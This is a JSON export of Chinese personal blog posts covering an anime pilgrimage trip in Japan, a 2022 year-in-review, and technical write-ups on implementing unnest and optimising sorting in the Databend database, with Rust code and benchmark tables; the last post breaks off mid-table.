[{"title":"RinChanNOW 的 2023 年 7 月圣地巡礼合集","path":"/2023-07-seichijunrei/","content":"二次元去日本当然要圣地巡礼。 动画场景对比图由于是 iOS 自动合成的，所以比例不太对，将就看了。 京阿尼与京吹JR 木幡站旁边的京阿尼本社与第五工作室： 走过 JR 木幡旁边的踏切后出现的在京吹中出现过的快餐店原型 M 记： 北宇治高校原型校京都府立莵道高等学校上学坡道与大门： 摇曳露营富士宫富士宫是抚子自己独自出来露营到过的地方，在这里进行了一些名场景复刻（ 这里的场景都在富士宫本宫浅间大社这个神社里。 然后我也来了一发玄学绘马 身延坐上 JR 身延线之后就开始了真正的巡礼之旅。 一到身延站摇曳露营浓度就开始直线上升了，不愧是带动山梨县旅游业的作品。 应该是去年剧场版的缘故，这里还有看起来挺新的芝麻凛旗子。 下面是一些身延站附近的动画场景复刻。 在身延还买了件芝麻凛的痛衣和亚克力钥匙扣，是真的贵啊。 甲斐常叶甲斐常叶就是摇曳露营的大本营了，也是主角团高中本栖高校原型校的所在地。 甲斐常叶可以说就是一个村子，基本没什么人，感觉现在就是作为摇曳露营取景地来发展旅游业了。 从 JR 甲斐常叶站到本栖高校的路上全是摇曳露营的宣传，直接上图。 车站旁的邮便局里也全是摇曳露营周边，还有摇曳露营真人剧抚子役演员大原优乃和动画惠那酱声优李依李的签名。可惜周边实在是太贵了，买不起。 这一天很巧的是，我们在去甲斐常叶巡礼的路上遇到了两个国人朝圣者，其中一个还穿着抚子的 kig，真是太有缘了。临别之际进行了一个合影。 孤独摇滚下北泽孤独摇滚在下北泽的圣地照片不用过多介绍了，都已经刻在 DNA 里了。直接上照片。 江之岛在东京的第二天我去了七里滨与江之岛玩，正好江之岛也有孤独摇滚的圣地，一并巡了。 主角团坐的小田急到的片濑江之岛站（然而我坐的是江电直接去七里滨了）： 主角团买乌贼仙贝的店： 上山之前的场景： 主角团吃冰淇淋的地方（以及波奇被海鸥击倒地的面前）： 青春猪头少年去七里滨与江之岛那当然就是青猪圣地了。由于前不久才上映了新的剧场版，所以能在这里看到很多青猪的宣传。 江之岛电车在藤泽的起始站： 七里滨江电镰仓高校前站，也是 OP 里咲太追电车后的第一个车站。（追电车的名场景拍了个视频: https://www.bilibili.com/video/BV12M4y1H7ex/） 七里滨车站，也是咲太一战成名的地方（此处需要站一个麻衣学姐，谢谢） 七里滨海滩，贡献了无数动画场景的地方。（二次元独有的构图） 江之岛典中典之麻衣学姐的广告。（不过自动贩卖机里的茶我觉得都挺难喝的） 然后是岛上一些对剧场版的宣传： 那天还有很多组团的 coser 上岛来不知道干啥，都是鬼灭之刃这种和江之岛完全毫无关联的作品的。是因为江之岛很适合出 cos 图吗？","tags":["ACG","日本","圣地巡礼"],"categories":["生活"]},{"title":"Databend Unnest 函数的实现","path":"/databend-unnest/","content":"unnest 是一个在分析查询中比较常见的函数，它的作用是将一个嵌套（多维）数组展开为一个一维向量。 1234567891011select unnest([1,2,3]);----123select unnest([[1,2],[3]]);----123 Tacking issue: https://github.com/datafuselabs/databend/issues/10295在下文中，我会逐步拆解 Databend 中实现 unnest 函数所需要处理的要点。 基本思路对于一般的函数，我们可以按照这个文档里的方法，通过统一的 FunctionFactory 进行注册。Databend 会通过统一抽象的 API 进行函数调用与向量化执行。 普通的函数的一行输入会对应一行输出，但是 unnest 并不是，它的一行输入会对应多行输出，这种函数也被称作 Set Returning Function (SRF)。所以我们并不能将 unnest 像普通函数一样通过 FuntionFactory 进行注册，而需要为其设计单独的逻辑。 参考 PostgreSQL 与 DuckDB 等数据库的实现可以发现，它们都将 unnest 函数重写为了一个单独的算子（PostgreSQL: ProjectSet 算子，DuckDB：UNNEST 算子）。因此，Databend 也沿用这种设计，单独抽离出一个 Unnest 算子进行相关计算。 Unnest 算子主要需要承载的功能是：接受 DataBlock 向量化输入，按照 unnest 列将输入的各行展开，最后将展开后的列组成 DataBlock 输出。但是这将会面临几个问题： 如何将原本的 EvalScalar算子（更进一步说，其中的 FunctionCall）转换为 Unnest 算子？ 如何处理 unnest 函数与其他操作结合的情况？（如 select unnest([1,2,3]) + 1，输出三行：2,3,4） 如何按照 unnest 列展开其他列？如何处理多个 unnest 列？ 且看下文分解。 构建算子上述的 1. 与 2. 其实可以归纳为同一个问题，那就是 Planner 如何为 Unnest 构建执行计划与算子。 Databend 表达式执行简介这里先简单说明一下 Databend 中表达式算子的构建与执行： AST -&gt; 逻辑计划。在 Bind 阶段，AST 中的表达式会被 semantic check 为 ScalarExpr，并被放入逻辑计划 EvalScalar 中。 逻辑计划 -&gt; 物理计划。在物理计划构建时，ScalarExpr 会被 expression check 为 Expr，并被放入物理计划 EvalScalar 中。Expr 是可以被 Evaluator 执行的结构。 物理计划 -&gt; 流水线算子。在构建流水线时，EvalScalar 会被构建为 BlockOperator::Map 算子。在流水线执行过程中，Map 算子会接受 DataBlock 并根据构建好的 Expr 进行计算。每一个 Expr 会输出一列数据，并添加到原始 DataBlock 的最后并输出到下游（不需要的列会被后续 Projection 算子移除）。 现在要在表达式计算中引入 Unnest，就在上述三个部分中做出修改。 Unnest 表达式对于构建逻辑计划，这里选择引入一个新的 ScalarExpr：ScalarExpr::Unnest。在 semantic check 时，可能会对特定函数调用进行重写，可以利用这个流程，将 unnest 函数调用重写为 ScalarExpr::Unnest 表达式（https://github.com/datafuselabs/databend/blob/583a3f2029d749b5974445fd90ad137dc0b2fc91/src/query/sql/src/planner/semantic/type_check.rs#L1704）。其结构如下： 1234pub struct Unnest &#123; pub argument: Box&lt;ScalarExpr&gt;, pub return_type: Box&lt;DataType&gt;,&#125; 后续的 RawExpr, Expr, RemoteExpr 结构可以直径从 ScalarExpr 转换得到。semantic check 也会保证 Unnest 的参数 argument 的返回类型一定是 DataType::Array。 P.S. Unnest 表达式依然是逻辑计划 EvalScalar 的一部分。 Unnest 物理计划接下来便是物理计划的构建。在上一节“基本思路”中提到，Unnest 是一种 SRF，与其他表达式的执行逻辑差别很大，需要单独设计一种算子，因此这里引入一个新的物理计划 Unnest。 12345678910pub struct Unnest &#123; /// A unique id of operator in a `PhysicalPlan` tree. /// Only used for display. pub plan_id: u32, pub input: Box&lt;PhysicalPlan&gt;, /// How many unnest columns. pub num_columns: usize, /// Only used for explain pub stat_info: Option&lt;PlanStatsInfo&gt;,&#125; 这里有一个取巧的地方，就是 Unnest 中只记录了有多少列 unnest 列 num_columns，可以这样做的原因稍后会解释。 在将逻辑计划 EvalScalar build 为物理计划 EvalScalar 时，如果表达式中存在 Unnest 表达式，我们需要把他们提取出来作为单独一层的物理计划。由于 Unnest 表达式需要能够与其他表达式一起嵌套使用，所以在构建物理计划的时候我们以 Unnest 为分界，将表达式计算的物理计划分成三层（编号为执行顺序）： 1233. Eval After Unnest Scalar |_______2. Unnest |_______1. Eval Before Unnest Scalar 每一层的列输入和列输出如下所示（编号与上述编号对应）： 1231. [i1, i2, .., in] -&gt; [i1, i2, .. in, b1, b2, .., bm]2. [i1, i2, .. in, b1, b2, .., bm] -&gt; [i1, i2, .. in, u1, u2, .., um]3. [i1, i2, .. in, u1, u2, .., un] -&gt; [i1, i2, .. in, u1, u2, .., um, o1, o2, .., op] 其中 n 为上游输入的列数，m 为 Unnest 列数，即 Unnest 内部参数需要执行的 Expr；p 为 Unnest 之后执行的表达式个数，即非 Unnest 函数内部参数需要执行的 Expr。 在真正执行时，计划 1. 会将需要执行 Unnest 的数据放到 DataBlock 后侧；计划 2. 会将 Unnest 参数列原地更新为展开后的 Unnest 列；计划 3. 将展开后的数据进行最后整体的表达式计算。 由于计划 2. 中需要执行 Unnest 的列一定在 DataBlock 的最后，所以我们只需要在 Unnest 计划中记录有多少 unnest 列即可。 在具体实现上，每一个 ScalarExpr 会被遍历两次，第一次会收集 Unnest 参数列，并转换成 Expr。第二次会将剩余的外层 ScalarExpr 转换成 Expr，在这个过程中，Unnest 子句会被替换为 Expr::ColumnRef，做为一个最底层数据列进行处理（和 Subquery 类似，因为这层 EvalScalar 能够直接拿到 Unnest 之后的数据，不用进行表达式计算了）。 两个此收集到的 Expr 会被分别构建为两个 PhysicalPlan::EvalScalar，分别为 PhysicalPlan::Unnest 的子计划与父计划。具体代码：https://github.com/datafuselabs/databend/blob/583a3f2029d749b5974445fd90ad137dc0b2fc91/src/query/sql/src/executor/physical_plan_builder.rs#L305 Unnest 流水线算子之前的工作都是 Unnest 之外的准备工作，本节将会介绍 Unnest 算子的具体执行流程，也是 Unnest 函数的核心所在。 单独展开 Unnest 列比较简单，直接提取参数 ArrayColumn 中的底层数据即可。实现 Unnest 的要点在于如何跟随 Unnest 列一起展开非 Unnest 列以及如何处理多 Unnest 列。 Unnest 的核心我总结为“按行展开”。也就是对于 Unnest 列中的每一行 a（每一行是一个 Array），我们将其展开为多行，在原数据中的对应的行的其他列需要和展开后的 a 对齐。对于非 Unnest 列，通过复制自己的值进行对齐（replicated）；对于 Unnest 列，以展开后最长的 Unnest 列为准，使用 NULL 补齐。 举个例子： 1234567891011121314151617+---------+--------+| arr | number |+---------+--------+| [1,2] | 0 || [3,4,5] | 1 |+---------+--------+↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓+-------------+--------+| unnest(arr) | number |+-------------+--------+| 1 | 0 || 2 | 0 || 3 | 1 || 4 | 1 |+-------------+--------+ 12345678910111213141516171819+---------+---------+| origin1 | origin2 |+---------+---------+| [1,2] | [1,2,3] || [3,4,5] | [4,5] |+---------+---------+↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓+---------+---------+| unnest1 | unnest2 |+------ --+---------+| 1 | 1 || 2 | 2 || NULL | 3 || 3 | 4 || 4 | 5 || 5 | NULL |+---------+---------+ 可见，展开后的行和展开前的行是对应的。 由于 Databend 是向量化执行，每一次计算会接受一个含有多行的 DataBlock，所以对 Unnest 的计算逻辑我们也最好对整个 DataBlock 进行一次性处理。由于 Databend 中 ArrayColumn 的结构为： 1234pub struct ArrayColumn&lt;T: ValueType&gt; &#123; pub values: T::Column, pub offsets: Buffer&lt;u64&gt;,&#125; 整个 Array 列其实是存在一个连续的内存中的（每一行数据根据 offsets 进行 slice 得出），因此我们可以直接将底层 Column 作为输出，再根据 offsets 展开复制 Unnest 列的数据即可。但整个过程只能应用于单 Unnest 列的情况，多 Unnest 列我们仍然需要按行处理。 因此，Unnest 算子的计算流程总体上分为两步： 处理所有 Unnest 列，得到对齐后的所有 Unnest 列以及统一的 offsets。（https://github.com/datafuselabs/databend/blob/583a3f2029d749b5974445fd90ad137dc0b2fc91/src/query/sql/src/evaluator/block_operator.rs#L235） 将上一步计算得到的 offsets 应用于非 Unnest 列进行复制，得到最后可以输出的结果。（https://github.com/datafuselabs/databend/blob/583a3f2029d749b5974445fd90ad137dc0b2fc91/src/query/sql/src/evaluator/block_operator.rs#L161） 其中第 2. 步比较简单，这里就重点介绍一下第 1. 步的具体流程。 首先，我们可以根据所有 Unnest 列的 offsets 提前计算出最后的 offsets 数组。即对于每一行，在所有 offset 中取最大值。 123456789101112131415161718192021// 提前收集 ArrayColumn 中的每一行 Columnlet unnest_columns = unnest_columns .into_iter() .map(|col| &#123; let typ = col.values.data_type().unnest(); let arrays = col.iter().map(|c| c.unnest()).collect::&lt;Vec&lt;_&gt;&gt;(); (typ, arrays) &#125;) .collect::&lt;Vec&lt;_&gt;&gt;();let mut offsets = Vec::with_capacity(num_rows + 1);offsets.push(0);let mut new_num_rows = 0; // Rows of the unnested `Column`s.for row in 0..num_rows &#123; let len = unnest_columns .iter() .map(|(_, col)| unsafe &#123; col.get_unchecked(row).len() &#125;) .max() .unwrap(); new_num_rows += len; offsets.push(new_num_rows);&#125; 然后，我们就可以开始按行遍历所有需要 unnest 的 ArrayColumn。如果当前行展开后的行数不满足结果需要的行数，则补 NULL（向 validity 这个 Bitmap 中填充 false）。为了充分利用编译器的向量化优化，我们应该尽量避免出现分支语句，又由于非 NULL 行和 NULL 行都是连续的，我们可以分别计算出它们所需要的行数并依次进行数据填充，从而避免使用分支语句。 123456789101112131415for (row, w) in offsets.windows(2).enumerate() &#123; let len = w[1] - w[0]; for ((typ, cols), builder) in unnest_columns.iter().zip(col_builders.iter_mut()) &#123; let inner_col = unsafe &#123; cols.get_unchecked(row) &#125;; let inner_len = inner_col.len(); debug_assert!(inner_len &lt;= len); builder.builder.append_column(inner_col); builder.validity.extend_constant(inner_len, true); // Avoid using `if branch`. let d = Scalar::default_value(typ); let defaults = ColumnBuilder::repeat(&amp;d.as_ref(), len - inner_len, typ).build(); builder.builder.append_column(&amp;defaults); builder.validity.extend_constant(len - inner_len, false); &#125;&#125; 以上便是 Unnest 函数执行的整个流程。 其他Table FunctionUnnest还能作为 table function 存在。 12345select * from unnest([[1,2],[3]]);----123 Unnest 多维（嵌套）数组从上面的 SQL 例子中可以看出，Databend 对齐 PostgreSQL，会将整个嵌套数组全部展开。因此，在语义检查以及计划构建阶段，Unnest 表达式/计划的返回类型也应该全部展开。否则会在分布式等场景下出现 BUG（序列化与反序列化的 schema 不匹配）。 相关方法： 1234567891011121314151617181920212223242526impl Column &#123; /// Unnest a nested column into one column. pub fn unnest(&amp;self) -&gt; Self &#123; match self &#123; Column::Array(array) =&gt; array.underlying_column().unnest(), col =&gt; col.clone(), &#125; &#125;&#125;impl&lt;T: ValueType&gt; ArrayColumn&lt;T&gt; &#123; pub fn underlying_column(&amp;self) -&gt; T::Column &#123; debug_assert!(!self.offsets.is_empty()); let range = *self.offsets.first().unwrap() as usize..*self.offsets.last().unwrap() as usize; T::slice_column(&amp;self.values, range) &#125;&#125;impl DataType &#123; pub fn unnest(&amp;self) -&gt; Self &#123; match self &#123; DataType::Array(ty) =&gt; ty.unnest(), _ =&gt; self.clone(), &#125; &#125;&#125;","tags":["数据库"],"categories":["数据库","源码笔记"]},{"title":"2022 事件簿","path":"/2022-events/","content":"2022 年对于我来说是很充实的一年，尤其是下半年，感觉经历了很多。 值得一提的事年初的寒假 年初和耿哥龙哥一起参加了 TiDB Hackthon 2021 并获得了三等奖。 学习了 MIT 6.S081。 阅读了 LevelDB 的源码。 面试了 Singularity Data （现 RisingWaveLabs），但是没过。 进行了一些开源活动。 研一下学期 完成了自己的小论文，投稿《自动化学报》，被拒。改为英文版转投 IEEE TII，但仍未 accept。 暑假 疫情严重，从学校”闭环“回家。人生第一次通宵（因为学校凌晨 3 点送站）。回家后爆睡近 14 个小时。 每周末都泡在环游嘉年华打街机。 参加阿里的开源之夏，项目是 alibaba/TairZset。 参加阿里云天池的一个比赛，在持久化内存傲腾上做一个高性能 KV 数据库。初赛前 10，复赛摆烂了。 研二上学期 从 1107 回到了 519。继承了学长的显示器与主机。搭建了三块显示器（左右两块竖屏，中间横屏）的工作环境，很爽。 把一位学长留下来的主机改造成了 NAS。在上面用 minio 构建了对象存储服务。 注册了一个有效期十年的域名。 追番回到了 BT 下载的年代。在 NAS 上依托 qbittorent + auto-bangumi + jellyfin 打造了一套全自动追番+下载+观看的工作流。通过 IPv6 访问这套服务。给服务绑定了域名，利用 NGINX 反代，并打通了 Websocket，使得 jellyfin 上可以多用户同步观看视频。顺手写了一个叫 mikan-notifier 的小工具，用来轮询 mikan 的番剧订阅，通过 QQ 机器人及时通知更新。 进入 Datafuselabs 实习，第一份数据库业界的工作。实现了几个较大的 feature，其中一个对 sort 算子的优化在 Databend 研究社活动中进行了分享。参与了新的类型系统和表达式框架的重构，这个过程中学习到了大量源码。 室友密接，整个宿舍去凤凰岭方舱隔离了几天。方舱是单人间，在深山老林里，相当于度假了。虽然是深山老林，但竟然没出海淀区。 参加了蚂蚁举办的绿色计算大赛，实现极致的数据压缩。被学长带躺拿了个特别奖。 通关了《勇敢的哈克》、《战神 5》、《奥日2》。 体重从 76 kg 减到了 67 kg。 开始玩注册了很久但一直没用的 bangumi，用 jellyfin 插件自动点格子。 为一些开源项目做了贡献。 遗憾的事 小论文投出去了但是仍未中刊，正在第二次 Major Revision。 仍然是单身。 音游力仍未见长，很多晚入坑的朋友花费比我少很多的时间就比我强了。 年末回家阳了。","tags":["年终总结","流水账"],"categories":["生活"]},{"title":"Databend Sort 优化","path":"/databend-sort-optimization/","content":"最近 Databend 针对数据排序进行了一波性能优化，在此记录一番。 排序操作在数据库中十分常见与重要。最常见的用法是将数据表按照某几个字段进行排序，或者找出数据表中最大或最小的几行（TopN）。 12SELECT * FROM table ORDER BY co11, col2; -- normal sortSELECT col FROM table ORDER BY col LIMIT n; -- top n Databend 的 RECLUSTER TABLE 命令也与排序息息相关，此命令会将数据表按照 CLUSTER KEY 重新组织，并最终使得底层数据分部遵循 CLUSTER KEY 有序排列。 排序在数据库中的重要性不言而喻。在优化之前，Databend 的排序实现比较简单，性能表现不太理想，所以需要进行重新设计与优化。 历史实现Databend 曾经的排序实现的十分简单——那就是不断地进行归并排序。 如图所示，Databend 会为每一个数据源分组建立一条 Partial Sort 流水线，然后通过 Resize 管道将多个流水线合一，然后再进行一次整体的归并排序得到最终的全序数据。 性能分析 很容易看出，这种流水线的瓶颈主要在于 MergeSort 阶段（火焰图也印证了这一点）。在实现中，MergeSort 会等待上游数据全部输入才会开始进行归并排序，因为只有这样才能保证数据最终的有序。然而，这种设计的一个最直接的影响就是：MergeSort 阻塞了流水线，下游算子需要等待所有数据块全部堆积在最后一个 MergeSort 并进行归并排序之后才能拿到数据。 1SELECT AVG(col) FROM (SELECT col FROM table ORDER BY col LIMIT n); 设想这样一条 SQL，AVG(col) 需要整个 (SELECT col FROM table ORDER BY col LIMIT n) 执行完毕后才能开始计算，这显然效率是十分低下的。 题外话：为了缓解排序阻塞带来的影响，Databend 会将 LIMIT 下推到排序阶段，使得归并排序得到目标数量行之后便可以直接输出，这在一定程度上优化了 TopN 。 所以直观的看来，有两个优化方向：第一个是并行化归并排序（见最后一节），第二种是让 MergeSort “流起来“，目前的实现选择了后者。 优化一：流式 MergeSort 如图所示，这里主要的改造是将 Resize 和第二个 MergSort 合并为了一个 MultiMergeSort，而此次优化的重点便是这个 MultiMergeSort。这个算子的主要思想很显而易见，那就是使用堆来进行多路归并。以小根堆为例，若 N 路升序序列都至少有一个元素被 push 入了堆（按照顺序），此时堆顶元素则为全局最小元素。依据这个特性，我们可以在从上游拉取数据并向堆中 push 元素的同时，pop 出堆顶元素输出到下游，使数据”流动“起来，让下游算子不用等到整个序列排序完成后才能开始工作。 实现细节DataBlock Cursor排序是粒度是行，但是在向量化执行下，算子之间传递的数据自然不会是一行一行的数据，而是一个一个的数据块，一个数据块中包含有多行。所以这里需要引入一个新的数据结构 Cursor 来表示具体的某一行数据。 123456struct Cursor &#123; pub input_index: usize, // Cursor 指向的数据是来自于哪个 input port // pub block_index: usize, // Cursor 指向的是哪一个 data block。可以省略，因为 heap 中每一个 block 只可能来自于不同的 input port。 pub row_index: usize, // Cursor 指向的是哪一行 // other fields&#125; 我们每次只用将 Cursor 推入堆中即可。Cursor 间的比较即为对应行排序键之间的比较。 Heap 操作针对堆的操作是整个 MultiMegeSort 的核心，整体算法流程大概为： 若堆中元素不少于输入数，执行下一步；否则结束此流程。 弹出堆顶 Cursor，将 Cursor 所指向的行推入待输出队列。 将 Cursor 指向下一行，若已遍历 block 中所有行，则标记此 input 可以拉取下一个 block 数据；否则，将递增后的 Cursor 放回堆中。 若待输出队列累计已达要求（limit 或 block_size），则退出此流程准备输出；否则，返回第 1 步。 对于上述第 2~3 步，有一个可以优化的地方，如下图所示。 我们其实不用每次都将 Cursor 回堆，徒增一次 O(log(N)) 的操作。如果递增后的 Cursor 仍然比下一个堆顶元素小，那么我们可以继续将递增后的 Cursor 所指向的行放入输出队列。更加特殊的，如果当前 Cursor 所指向的 block 的最后一行元素都比下一个堆顶元素小，那么可以直接将从当前 Cursor 起此 block 中的所有数据都放入待输出队列。 通过实验证明，这个小细节会让查询快很多。对于一些比较特殊的语句甚至有 3 倍以上的提升，比如下面这个语句： 12SELECT * FROM numbers(10000000) ORDER BY number;SELECT * FROM numbers(10000000) ORDER BY number DESC; 因为 numbers 产生的 block 之间没有数据交叉，每个 block 之间本身就具有顺序。 这整体部分的代码如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859while self.heap.len() &gt;= nums_active_inputs &amp;&amp; !need_output &#123; match self.heap.pop() &#123; Some(Reverse(mut cursor)) =&gt; &#123; let input_index = cursor.input_index; if self.heap.is_empty() &#123; // If there is no other block in the heap, we can drain the whole block. need_output = self.drain_cursor(cursor); &#125; else &#123; let next_cursor = &amp;self.heap.peek().unwrap().0; // If the last row of current block is smaller than the next cursor, // we can drain the whole block. if cursor.last().le(&amp;next_cursor.current()) &#123; need_output = self.drain_cursor(cursor); &#125; else &#123; let block_index = self.blocks[input_index].len() - 1; while !cursor.is_finished() &amp;&amp; cursor.le(next_cursor) &#123; // If the cursor is smaller than the next cursor, don&#x27;t need to push the cursor back to the heap. self.in_progess_rows.push(( input_index, block_index, cursor.advance(), )); if let Some(limit) = self.limit &#123; if self.in_progess_rows.len() == limit &#123; need_output = true; break; &#125; &#125; &#125; if !cursor.is_finished() &#123; self.heap.push(Reverse(cursor)); &#125; else &#123; // We have read all rows of this block, need to read a new one. self.cursor_finished[input_index] = true; &#125; &#125; &#125; // Reach the block size, need to output. if self.in_progess_rows.len() &gt;= self.block_size &#123; need_output = true; break; &#125; if self.cursor_finished[input_index] &amp;&amp; !self.input_finished[input_index] &#123; // Correctness: if input is not finished, we need to pull more data, // or we can continue this loop. break; &#125; &#125; None =&gt; &#123; // Special case: self.heap.len() == 0 &amp;&amp; nums_active_inputs == 0. // `self.in_progress_rows` cannot be empty. // If reach here, it means that all inputs are finished but `self.heap` is not empty before the while loop. // Therefore, when reach here, data in `self.heap` is all drained into `self.in_progress_rows`. debug_assert!(!self.in_progess_rows.is_empty()); self.state = ProcessorState::Output; break; &#125; &#125;&#125; Processor 状态机由于 Databend 的流水线框架基于 Morsel-Driven Parallelism 的，所以需要为每一个 Processor 算子设计一个状态机。这里简单描述一下 MultiMergeSort 的状态机模型。整体状态机大致如下图所示，其中省略了一些边界情况。 Consume: 拉取数据 block，转为 Preserve 状态。 Preserve: 核心逻辑状态。将 block 推入堆中并执行上一节所示的堆操作流程。若可以进行输出，则转为 Output 状态；否则回到 Consume 状态进行下一波数据拉取。 Output: 构造输出 block，转为 Generated 状态。 Generated: 将需要输出的 block 推入 output port。 性能分析 上图是流化 MergeSort 之后（没有进行堆操作优化）的火焰图。可见，性能瓶颈从归并排序转换了堆操作，其中推操作的瓶颈又在于 Cursor 之间的比较运算。所以接下来便引出了本次的第二个优化点：Row Format。 优化二：Row Format在堆操作中需要对不同行的排序键进行比较运算。Databend 基于 arrow2 来做的内存列式存储与计算，在比较两列中某一行数据时，需要先调用 build_compare 为两列建立比较函数，然后再调用比较函数得到两列中指定两行的比较结果。由于 build_compare 所得到的函数会根据待比较两列的类型进行动态分发（虚函数），并且需要在堆内存进行随机寻址，所以效率十分低下（从上面的火焰图也可以看出）。 因此，我们想要消除 build_comapre 以及列内随机查询带来的开销。如果 Cursor 可以直接相比，而不是会间接进行一层函数调用就好了——这就是内存 Row 结构产生的契机。除了排序计算，Row 结构在 Join 运算中也会带来性能上的提升，不过这是后话了。 这里的需求就是：将列数据转换为一种可以直接用来比较的行数据。正好前不久，Apache Arrow 引入了一种专门用于比较运算的 Row Format，并将其用在了 arrow-datafusion 并为排序带来了 50% ~ 70% 的性能提升，于是我便将其移植到了 arrow2 中以供 Databend 使用。 实现细节整体的实现细节可参见 arrow 的博客。我在这里进行一些重要类型的说明。 12345678910111213141516┌─────┐ ┌─────┐ ┌─────┐│ │ │ │ │ │├─────┤ ┌ ┼─────┼ ─ ┼─────┼ ┐ ┏━━━━━━━━━━━━━┓│ │ │ │ │ │ ─────────────▶┃ ┃├─────┤ └ ┼─────┼ ─ ┼─────┼ ┘ ┗━━━━━━━━━━━━━┛│ │ │ │ │ │└─────┘ └─────┘ └─────┘ ...┌─────┐ ┌ ┬─────┬ ─ ┬─────┬ ┐ ┏━━━━━━━━┓│ │ │ │ │ │ ─────────────▶┃ ┃└─────┘ └ ┴─────┴ ─ ┴─────┴ ┘ ┗━━━━━━━━┛Customer State Orders UInt64 Utf8 F64 Input Arrays Row Format (Columns) 通用逻辑 整个行数据编码由各个排序键编码依次连接而成。 所有类型的数据的第一个字节都是用来表示是否为 NULL。若为 NULL，只占一个字节。 若不为 NULL，此字节为 0x01（一般情况，变长类型可能为 0x02）。 若排序选项 null first 为 true，NULL 字节为 0x00。 若排序选项 null first 为 false，NULL 字节为 0xFF。 如果排序选项为降序排序，则将整个数据按位反转。 行的比较即为底层二进制数据的 memcmp 比较，即：依次比较二进制位，碰到第一个不同二进制数是便可得出结果。 无符号整数按照大端方式编码。 123456789101112131415 ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┬──┐ 3 │03│00│00│00│ │01│00│00│00│03│ └──┴──┴──┴──┘ └──┴──┴──┴──┴──┘ ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┬──┐ 258 │02│01│00│00│ │01│00│00│01│02│ └──┴──┴──┴──┘ └──┴──┴──┴──┴──┘ ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┬──┐23423 │7F│5B│00│00│ │01│00│00│5B│7F│ └──┴──┴──┴──┘ └──┴──┴──┴──┴──┘ ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┬──┐NULL │??│??│??│??│ │00│00│00│00│00│ └──┴──┴──┴──┘ └──┴──┴──┴──┴──┘ 32-bit (4 bytes) Row FormatValue Little Endian 有符号整数按照补码编码。 123456789 ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┬──┐ 5 │05│00│00│00│ │05│00│00│80│ │01│80│00│00│05│ └──┴──┴──┴──┘ └──┴──┴──┴──┘ └──┴──┴──┴──┴──┘ ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┐ ┌──┬──┬──┬──┬──┐ -5 │FB│FF│FF│FF│ │FB│FF│FF│7F│ │01│7F│FF│FF│FB│ └──┴──┴──┴──┘ └──┴──┴──┴──┘ └──┴──┴──┴──┴──┘Value 32-bit (4 bytes) High bit flipped Row Format Little Endian 浮点数按照 IEEE 754。 变长类型（字符串，字符数组）基本思想：COBS 编码。 NULL 用 0x00 表示，空串用 0x01 表示，非空串用 0x02 打头（使得非空串一定比空串大）。变长类型的数据长度被设计为 32 的整数倍，即：未满 32 字节用 0 填充到 32字节（选择 32 是因为 AVX-256 一次可拷贝 32 字节）。每 32 字节最后用 0xFF 结束，除了最后一块，最后一块用该块的数据长度来结束。下面用 4 字节代替 32 字节来演示： 1234567891011121314151617181920212223 ┌───┬───┬───┬───┬───┬───┐ &quot;MEEP&quot; │02 │&#x27;M&#x27;│&#x27;E&#x27;│&#x27;E&#x27;│&#x27;P&#x27;│04 │ └───┴───┴───┴───┴───┴───┘ ┌───┐ &quot;&quot; │01 | └───┘ NULL ┌───┐ │00 │ └───┘&quot;Defenestration&quot; ┌───┬───┬───┬───┬───┬───┐ │02 │&#x27;D&#x27;│&#x27;e&#x27;│&#x27;f&#x27;│&#x27;e&#x27;│FF │ └───┼───┼───┼───┼───┼───┤ │&#x27;n&#x27;│&#x27;e&#x27;│&#x27;s&#x27;│&#x27;t&#x27;│FF │ ├───┼───┼───┼───┼───┤ │&#x27;r&#x27;│&#x27;a&#x27;│&#x27;t&#x27;│&#x27;r&#x27;│FF │ ├───┼───┼───┼───┼───┤ │&#x27;a&#x27;│&#x27;t&#x27;│&#x27;i&#x27;│&#x27;o&#x27;│FF │ ├───┼───┼───┼───┼───┤ │&#x27;n&#x27;│00 │00 │00 │ 1 │ └───┴───┴───┴───┴───┘ 分块这种设计让变长类型转换为了定长类型，能够解决有多个排序键时可能引入的问题。如果直接按照变长类型本身进行编码，考虑下面这一种场景，其中有两个排序键都为变长类型，且他们的编码都如下： 12345┌───┬───┬───┬───┬───┬───┐│02 │ 01│ 02│ 02│ 01│ 01│└───┴───┴───┴───┴───┴───┘ckey 1: 02 01, 02 02 01 01ckey 2: 02 01 02, 02 01 01 由于 ckey1 的第一个 key 比 ckey2 的第一个 key 小，最后的结果应该是 ckey1 &lt; ckey2，然而按照这种 encoding 方式结果却是相等！只要不按照定长划分，当存在多个排序键时都可能存在问题。 而上述分块的编码方式一定可以在当前排序键的范围内得出比较结果（显而易见）。 字典类型字典类型是 Arrow 中一种用来保存低基数数据的类型，在 Databend 中似乎没有使用，这里不做过多介绍。想了解的话请到博客原文中查看。 性能分析 和上一节的火焰图相比，可以看出，比较操作的占比大幅度减小，比较还用上了 avx2 向量化指令集进行 memcmp 的比较。 最终优化结果可见，经过以上的优化，使得排序运算得到了不小的提升。 另外，对 hits 表（1亿行数据） 的 RECLUSTER 操作也不会 OOM 了（内存维持在 10G 以内）。 sort ID new old old / new SQL 1 0.49185555 1.58862891 3.22986883 select * from numbers(10000000) order by number; 2 0.49170787 1.64183498 3.33904556 select * from numbers(10000000) order by number desc; 3 0.09856892 0.26789701 2.717864921 select userid, flashmajor from hits order by flashmajor, userid desc; 4 0.06503526 0.1700541 2.614798495 select resolutiondepth from hits order by resolutiondepth; 5 0.27688674 0.35350362 1.276708375 select title from hits order by title; 6 0.29328114 0.34813435 1.187032859 select title from hits order by title desc; 7 0.30203853 0.46025009 1.523812508 select userid, title from hits order by userid, title; 8 0.29694118 0.47894412 1.6129259 select userid, title from hits order by userid desc, title; 9 0.29833156 0.46893471 1.571857533 select userid, title from hits order by userid, title desc; 10 0.29689456 0.39771965 1.339598981 select userid, title from hits order by userid desc, title desc; top100 ID new old old / new SQL 1 0.02551741 0.02539468 0.995190343 select * from numbers(10000000) order by number limit 100; 2 0.02533295 0.02419826 0.955208928 select * from numbers(10000000) order by number desc limit 100; 3 0.06810979 